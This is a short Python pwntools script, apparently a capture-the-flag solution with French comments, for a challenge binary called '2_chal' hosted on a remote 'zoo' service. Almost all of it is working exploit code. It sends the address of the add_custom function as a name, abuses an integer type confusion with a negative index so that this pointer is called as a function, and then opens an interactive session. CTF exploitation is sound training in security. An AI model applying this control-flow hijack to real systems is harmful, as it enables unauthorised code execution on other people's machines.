#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('../dist/2_chal')

io = remote('zoo.serviel.fr', 1234, ssl=True)

# on récupère l'addresse de la fonction add_custom
io.sendlineafter(b'tom nom ? ', p64(exe.sym['add_custom'])) 

# Abuse int type confusion and use pointer in the name as a function
io.sendlineafter(b'-> ', str(-0x20 // 8).encode())

# On crée un animal custom
io.sendlineafter(b'animal: ', b'1')
io.sendlineafter(b'animal: ', b'toto')
io.sendlineafter(b'animal: ', b'toto')

# List animals
io.sendlineafter(b'-> ', b'4')

io.interactive()